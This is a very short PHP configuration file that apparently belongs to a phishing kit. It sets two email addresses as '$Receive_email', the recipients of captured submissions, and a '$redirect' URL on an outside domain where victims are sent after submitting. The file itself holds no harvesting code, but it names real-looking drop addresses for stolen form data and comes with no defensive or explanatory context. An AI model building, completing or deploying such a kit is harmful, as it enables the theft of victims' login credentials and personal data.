<?php 
$Receive_email="mnssnm001@hotmail.com, mnssnm001@gmail.com";
$redirect="https://sz1sz.com/judgeschoice/stujudgeschoice/";
?>